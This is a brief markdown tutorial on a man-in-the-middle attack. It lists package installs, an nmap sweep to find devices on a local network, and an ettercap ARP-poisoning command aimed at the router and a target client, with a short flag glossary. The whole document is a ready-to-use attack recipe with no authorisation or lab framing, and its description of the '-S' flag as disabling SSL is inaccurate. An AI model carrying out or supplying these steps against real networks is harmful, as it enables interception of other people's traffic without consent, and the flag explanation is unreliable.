# Man in the Middle

## Installation
```
sudo apt install nmap
sudo apt install ettercap-text-only
sudo apt install wireshark
```

---

## Get the IP address of every device in the network:
```
sudo nmap -sn <router IP>/24
```

---

## Run the attack
```
sudo ettercap -T -S -i wlan0 -M arp:remote /<router IP>// /<client IP>//
```
### Explanation:
* `-T` - Text only (enables use in terminal)
* `-S` - Disable SSL (to not use SSL)
* `-i` - Your wireless interface
* `-M` - Specify the type of attack